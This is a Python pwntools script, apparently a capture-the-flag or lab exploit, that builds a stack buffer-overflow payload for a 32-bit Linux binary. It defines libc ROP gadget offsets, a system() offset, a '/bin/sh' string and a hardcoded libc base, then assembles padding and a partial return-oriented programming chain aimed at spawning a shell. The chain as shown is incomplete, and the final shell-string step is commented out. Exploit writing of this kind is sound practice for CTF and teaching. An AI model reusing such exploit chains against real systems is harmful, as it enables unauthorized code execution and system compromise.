from pwn import *

inc_eax = 0x00129935 # inc eax ; pop esp ; ret
add_eax_7 = 0x0014707a # test dl, 0x40 ; jne 0x1470e4 ; add eax, 7 ; ret
add_eax_0xd = 0x00149228 # ror byte ptr [edi + ebx*2], 0xc3 ; add eax, 0xd ; pop edi ; ret
xchg_ebx_eax = 0x00076063 # xchg ebx, eax ; iretd
add_eax_edx = 0x000a866d # pop esi ; add eax, edx ; ret
pop_eax = 0x000b7d44 # pop eax ; cmp eax, 0xfffff001 ; jae 0xb7d4d ; ret
sub_eax_ecx = 0x00145279 # sub eax, ecx ; pop ebp ; pop ebx ; ret
pop_ecx = 0x00174a51 # pop ecx ; add al, 0xa ; ret
mov_ebx_edx = 0x000a8476 # mov ebx, edx ; cmp eax, 0xfffff001 ; jae 0xa8480 ; ret
sub_edx_eax = 0x000a565c # sub edx, eax ; pop esi ; mov eax, edx ; pop edi ; pop ebp ; ret
pop_edi = 0x55603661 #  pop edi ; pop ebp ; ret
xchg_edi_eax = 0x00198061 # xchg edi, eax ; or cl, byte ptr [esi] ; adc al, 0x43 ; ret
mov_ecx_esp_v = 0x00129d77 # mov ecx, dword ptr [esp] ; ret
xor_eax_eax =0x00055670 # xor eax, eax ; add esp, 0xc ; ret
add_edx_ecx = 0x00132b72 # add edx, ecx ; jmp ebx

push_esi_call_eax = 0x00116953 # test eax, eax ; je 0x11695c ; mov dword ptr [esp], esi ; call eax
push_edx_call_eax = 0x00067c4e # mov dword ptr [esp + 8], ecx ; mov dword ptr [esp], edx ; call eax


PADDING = 0x18

SYSTEM_OFFSET = 0x0003eed0

BINSH = b'/bin/sh\x00'

libc_base = 0x5555e000
libc_start_GOT = 0x0804c00c
one_gadget = 0x6667b

def main():
    payload = b""
    payload += PADDING * b"a"
    payload += b'bbbb'#ebx
    payload += b'cccc'#ebp

    #payload += p32(0x556f4522)
    #print(payload)
    #exit(0)
    #payload += p32(libc_base + xchg_edi_eax)

    payload += p32(libc_base + pop_ecx)
    payload += p32(0x354b477c)

    payload += p32(libc_base + pop_eax)
    payload += p32(0x20207070)

    payload += p32(libc_base + sub_eax_ecx)
    payload += p32(0x21212121)
    payload += p32(0x21212121)
    #payload += BINSH
    
    
    print(payload.decode().replace('\\','\\\\').replace('`', '\`'))
    
if __name__ == "__main__":
    main()
    